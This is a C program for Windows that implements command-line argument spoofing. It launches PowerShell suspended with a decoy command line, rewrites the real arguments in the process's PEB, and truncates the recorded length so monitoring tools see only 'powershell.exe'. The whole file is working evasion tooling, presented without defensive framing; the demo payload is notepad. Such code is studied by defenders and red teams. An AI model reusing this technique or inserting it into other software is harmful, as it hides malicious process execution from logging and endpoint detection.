#include <windows.h>
#include <winternl.h>
#include <stdio.h>

// Typedef for NtQueryInformationProcess function
typedef NTSTATUS(NTAPI *fnNtQueryInformationProcess)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);

// Helper function to read memory from the target process
BOOL ReadFromTargetProcess(IN HANDLE hProcess, IN PVOID pAddress, OUT PVOID *ppReadBuffer, IN DWORD dwBufferSize)
{
    SIZE_T sNmbrOfBytesRead = NULL;

    *ppReadBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwBufferSize);

    // Read the memory from the target process
    if (!ReadProcessMemory(hProcess, pAddress, *ppReadBuffer, dwBufferSize, &sNmbrOfBytesRead) || sNmbrOfBytesRead != dwBufferSize)
    {
        printf("[!] ReadProcessMemory Failed With Error : %d \n", GetLastError());
        printf("[i] Bytes Read : %d Of %d \n", sNmbrOfBytesRead, dwBufferSize);
        return FALSE;
    }

    return TRUE;
}

// Helper function to write memory to the target process
BOOL WriteToTargetProcess(IN HANDLE hProcess, IN PVOID pAddressToWriteTo, IN PVOID pBuffer, IN DWORD dwBufferSize)
{
    SIZE_T sNmbrOfBytesWritten = NULL;

    // Write the memory to the target process
    if (!WriteProcessMemory(hProcess, pAddressToWriteTo, pBuffer, dwBufferSize, &sNmbrOfBytesWritten) || sNmbrOfBytesWritten != dwBufferSize)
    {
        printf("[!] WriteProcessMemory Failed With Error : %d \n", GetLastError());
        printf("[i] Bytes Written : %d Of %d \n", sNmbrOfBytesWritten, dwBufferSize);
        return FALSE;
    }

    return TRUE;
}

// Function to create a process with spoofed arguments
BOOL CreateArgSpoofedProcess(IN LPWSTR szStartupArgs, IN LPWSTR szRealArgs, OUT DWORD *dwProcessId, OUT HANDLE *hProcess, OUT HANDLE *hThread)
{
    NTSTATUS STATUS = NULL;

    WCHAR szProcess[MAX_PATH];

    STARTUPINFOW Si = {0};
    PROCESS_INFORMATION Pi = {0};

    PROCESS_BASIC_INFORMATION PBI = {0};
    ULONG uRetern = NULL;

    PPEB pPeb = NULL;
    PRTL_USER_PROCESS_PARAMETERS pParms = NULL;

    RtlSecureZeroMemory(&Si, sizeof(STARTUPINFOW));
    RtlSecureZeroMemory(&Pi, sizeof(PROCESS_INFORMATION));

    Si.cb = sizeof(STARTUPINFOW);

    // Getting the address of the NtQueryInformationProcess function
    fnNtQueryInformationProcess pNtQueryInformationProcess = (fnNtQueryInformationProcess)GetProcAddress(GetModuleHandleW(L"NTDLL"), "NtQueryInformationProcess");
    if (pNtQueryInformationProcess == NULL)
        return FALSE;

    lstrcpyW(szProcess, szStartupArgs);

    // Create the process in suspended state and with no window
    if (!CreateProcessW(
            NULL,
            szProcess,
            NULL,
            NULL,
            FALSE,
            CREATE_SUSPENDED | CREATE_NO_WINDOW,
            NULL,
            L"C:\\Windows\\System32\\", // Path where the process will be created
            &Si,
            &Pi))
    {
        printf("\t[!] CreateProcessA Failed with Error : %d \n", GetLastError());
        return FALSE;
    }

    // Getting the PROCESS_BASIC_INFORMATION structure of the remote process which contains the PEB address
    if ((STATUS = pNtQueryInformationProcess(Pi.hProcess, ProcessBasicInformation, &PBI, sizeof(PROCESS_BASIC_INFORMATION), &uRetern)) != 0)
    {
        printf("\t[!] NtQueryInformationProcess Failed With Error : 0x%0.8X \n", STATUS);
        return FALSE;
    }

    // Reading the PEB structure from its base address in the remote process
    if (!ReadFromTargetProcess(Pi.hProcess, PBI.PebBaseAddress, &pPeb, sizeof(PEB)))
    {
        printf("\t[!] Failed To Read Target's Process Peb \n");
        return FALSE;
    }

    // Reading the RTL_USER_PROCESS_PARAMETERS structure from the PEB of the remote process
    // Read an extra 0xFF bytes to ensure we have reached the CommandLine.Buffer pointer
    if (!ReadFromTargetProcess(Pi.hProcess, pPeb->ProcessParameters, &pParms, sizeof(RTL_USER_PROCESS_PARAMETERS) + 0xFF))
    {
        printf("\t[!] Failed To Read Target's Process ProcessParameters \n");
        return FALSE;
    }

    // Writing the real argument to the process
    if (!WriteToTargetProcess(Pi.hProcess, (PVOID)pParms->CommandLine.Buffer, (PVOID)szRealArgs, (DWORD)(lstrlenW(szRealArgs) * sizeof(WCHAR) + 1)))
    {
        printf("\t[!] Failed To Write The Real Parameters\n");
        return FALSE;
    }

    // Updating the length of the command line argument
    DWORD dwNewLen = sizeof(L"powershell.exe");
    if (!WriteToTargetProcess(Pi.hProcess, ((PBYTE)pPeb->ProcessParameters + offsetof(RTL_USER_PROCESS_PARAMETERS, CommandLine.Length)), (PVOID)&dwNewLen, sizeof(DWORD)))
    {
        return FALSE;
    }

    // Cleaning up
    HeapFree(GetProcessHeap(), NULL, pPeb);
    HeapFree(GetProcessHeap(), NULL, pParms);

    // Resuming the process with the new parameters
    ResumeThread(Pi.hThread);

    // Saving output parameters
    *dwProcessId = Pi.dwProcessId;
    *hProcess = Pi.hProcess;
    *hThread = Pi.hThread;

    // Checking if everything is valid
    if (*dwProcessId != NULL && *hProcess != NULL && *hThread != NULL)
        return TRUE;

    return FALSE;
}

int main()
{
    LPWSTR szStartupArgs = L"powershell.exe -c Write-Host Totally Legit";
    LPWSTR szRealArgs = L"powershell.exe -c notepad.exe";
    DWORD dwProcessId;
    HANDLE hProcess;
    HANDLE hThread;

    // Creating the spoofed process
    if (CreateArgSpoofedProcess(szStartupArgs, szRealArgs, &dwProcessId, &hProcess, &hThread))
    {
        printf("Process created successfully with Process ID: %d\n", dwProcessId);
    }
    else
    {
        printf("Failed to create process.\n");
    }

    // Close process and thread handles
    CloseHandle(hProcess);
    CloseHandle(hThread);

    return 0;
}
